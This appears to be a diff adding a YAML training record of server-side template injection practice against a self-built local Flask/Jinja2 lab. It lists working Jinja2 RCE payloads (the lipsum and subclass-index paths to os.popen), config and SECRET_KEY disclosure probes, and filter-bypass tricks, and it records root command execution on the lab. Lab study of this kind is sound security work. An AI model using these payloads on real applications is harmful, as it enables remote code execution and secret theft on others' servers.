@@ -1,0 +1,84 @@
+# 案例: SSTI 自主学习训练 (Flask/Jinja2 本地靶场)
+# 日期: 2026-07-22
+# 目标: 本地 Flask/Jinja2 SSTI 训练靶场 (自建)
+# 类型: 公开靶场 / 自主学习
+
+target:
+  url: "http://127.0.0.1:9999"
+  type: lab
+  name: "SSTI Training Lab (Flask/Jinja2)"
+  tech_stack:
+    - "Python 3.13"
+    - "Flask 3.1.2"
+    - "Jinja2 (render_template_string)"
+  ports: [9999]
+  fingerprint:
+    engine: "Jinja2 ({{7*7}} → 49)"
+    framework: "Flask ({{config}} → SECRET_KEY)"
+    python_version: "3.13"
+
+attack_surface:
+  - "/lab1?name= - 基础 SSTI（直接拼入模板）"
+  - "/lab2?greeting=&user= - 用户自定义模板内容"
+  - "/lab3?product= - 错误消息反射"
+  - "/lab4?name= - 过滤 __ 和 class 的受限场景"
+  - "/lab5?tid= - 盲 SSTI（无直接回显）"
+
+techniques_tried:
+  - technique: "SSTI 检测（多引擎探针）"
+    result: "success"
+    detail: "{{7*7}}→49, {{config}}→SECRET_KEY泄露, {{'a'.__class__}}→str类型确认"
+
+  - technique: "Jinja2 RCE (subclass 枚举路径)"
+    result: "success"
+    detail: "object.__subclasses__()[158] (os._wrap_close) → __init__.__globals__ → os.popen('id')"
+
+  - technique: "Jinja2 RCE (lipsum 快捷路径)"
+    result: "success"
+    detail: "lipsum.__globals__['os'].popen('id').read() — 最短 RCE payload"
+
+  - technique: "过滤绕过 (__ 和 class 被 replace)"
+    result: "success"
+    detail: "\\x5f 替代 _ → 绕过 __ 过滤; 'cl'~'ass' 绕过 class 过滤; |attr() 动态属性访问"
+
+  - technique: "盲 SSTI (时间延迟)"
+    result: "partial"
+    detail: "{% extends %} 上下文中的时间注入未触发; 其他盲注向量待验证"
+
+success_path:
+  - step: 1
+    action: "SSTI检测: {{7*7}} → 响应含 49, 确认 Jinja2 SSTI"
+    technique: "detection"
+  - step: 2
+    action: "信息收集: {{config}} → Flask SECRET_KEY 泄露"
+    technique: "info-disclosure"
+  - step: 3
+    action: "类型确认: {{'a'.__class__}} → <class 'str'>, 确认对象遍历可行"
+    technique: "fingerprinting"
+  - step: 4
+    action: "RCE via lipsum: {{lipsum.__globals__['os'].popen('id').read()}} → uid=0(root)"
+    technique: "rce"
+  - step: 5
+    action: "RCE via subclass: object.__subclasses__()[158] → os._wrap_close → RCE"
+    technique: "rce"
+  - step: 6
+    action: "过滤绕过: \\x5f 替代 _, 'cl'~'ass' 拼接, |attr() 动态访问"
+    technique: "filter-bypass"
+
+techniques_learned:
+  - "SSTI检测三件套: {{7*7}}数学, {{config}}配置泄露, {{'a'.__class__}}类型泄露"
+  - "多引擎探针: ${{<%[%'\"}} 触发不同引擎报错 → 从报错识别引擎"
+  - "Jinja2 RCE最短路径: lipsum.__globals__['os'].popen('cmd').read()"
+  - "Python 3.13 subclass索引: os._wrap_close 在 object.__subclasses__() 索引 158"
+  - "__过滤绕过: Jinja2字符串中 \\x5f 被解析为 _"
+  - "class过滤绕过: 'cl'~'ass' 使用 ~ 拼接（Jinja2字符串拼接操作符）"
+  - "attr()动态访问: |attr('__globals__') 无需 . 操作符"
+  - "Flask特有: request.application.__self__._get_data_for_json 是备选RCE路径"
+  - "盲SSTI: {% extends %} 中直接注入受限; 需要 echo 型场景或 %if% 条件分支"
+
+fingerprint_triggers:
+  - "{{7*7}} 返回 49 → Jinja2/Twig (进一步用 {{config}} 区分)"
+  - "{{config}} 返回 Flask 配置 → Flask/Jinja2 确认"
+  - "${{<%[%'\"}} 触发 jinja2.exceptions 报错 → Jinja2 确认"
+  - "过滤 __ 和 class → 用 \\x5f 和 'cl'~'ass' 绕过"
+  - "存在 lipsum/cycler/joiner/namespace → Jinja2 内置函数可作 RCE 入口"
